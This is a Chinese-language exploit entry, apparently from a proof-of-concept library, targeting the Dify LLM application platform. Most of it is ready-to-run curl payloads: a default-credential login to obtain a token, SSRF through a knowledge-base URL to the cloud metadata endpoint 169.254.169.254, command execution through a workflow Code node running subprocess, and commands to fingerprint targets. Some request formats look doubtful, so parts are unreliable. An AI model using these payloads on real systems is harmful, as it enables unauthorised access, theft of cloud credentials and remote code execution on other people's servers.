---
id: DIFY-SSRF-RCE
title: Dify SSRF + 沙箱逃逸远程代码执行漏洞
product: dify
vendor: LangGenius
version_affected: "< 0.6.12"
severity: CRITICAL
tags: [rce, ssrf, sandbox_bypass, ai, llm, 需要认证]
fingerprint: ["Dify", "dify", "/console/api/", "/v1/chat-messages", "/v1/workflows"]
---

## 漏洞描述

Dify是一款LLM应用开发平台，存在多个安全漏洞：SSRF(通过知识库URL)、代码执行(通过Code节点沙箱逃逸)、默认密钥等。

## 影响版本

- Dify < 0.6.12（SSRF、沙箱逃逸）
- Dify 所有版本（默认凭据风险）

## 前置条件

- 目标 Dify 服务（默认80/443端口）可从网络访问
- 默认凭据未修改（`admin@example.com` / `admin`）或可通过初始化设置获取管理权限
- SSRF/RCE 需已认证用户权限

## 利用步骤

### SSRF 通过知识库

在创建知识库数据源时，URL参数可被利用进行SSRF:
```
http://169.254.169.254/latest/meta-data/
```

### 代码节点沙箱逃逸

在Workflow的Code节点中:
```python
import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
return {"result": result.stdout}
```

### 默认凭据

- 管理后台: `admin@example.com` / `admin`
- API密钥泄露: `GET /console/api/datasets?page=1`
- 默认SECRET_KEY可能为硬编码

### 未授权API访问

```bash
# 列出应用
curl http://target/console/api/apps -H "Authorization: Bearer <default_key>"
# 列出对话
curl http://target/v1/chat-messages -H "Authorization: Bearer app-xxx"
```

## Payload

### 默认凭据登录获取 Token

```bash
TOKEN=$(curl -s -X POST http://target/console/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin"}' \
  | jq -r '.data.access_token')
```

### SSRF — 通过知识库抓取内部服务

```bash
curl -s -X POST http://target/console/api/datasets \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ssrf-test",
    "data_source": {
      "type": "url",
      "info": {"url": "http://169.254.169.254/latest/meta-data/"}
    }
  }'
```

### 代码节点沙箱逃逸 RCE

```bash
curl -s -X POST http://target/console/api/apps/<app_id>/workflows/run \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "inputs": {},
    "nodes": [{
      "type": "code",
      "data": {
        "code": "import subprocess; result = subprocess.run([\"id\"], capture_output=True, text=True); return {\"result\": result.stdout}"
      }
    }]
  }'
```

## 验证方法

```bash
# 1. 确认默认凭据可登录
curl -s -X POST http://target/console/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin"}' \
  | grep '"access_token"'

# 2. 确认初始化状态（未初始化可直接设置管理员）
curl -s http://target/console/api/setup | grep '"step"'

# 3. SSRF 验证：知识库返回内部服务响应内容
curl -s http://target/console/api/datasets?page=1 \
  -H "Authorization: Bearer $TOKEN" \
  | grep '"name"'

# 4. RCE 验证：Code 节点响应中包含命令输出（如 uid=xxx）
```

## 指纹确认

```bash
curl -s http://target/ | grep -i "dify"
curl -s http://target/console/api/setup
curl -s http://target/api/v1/
```
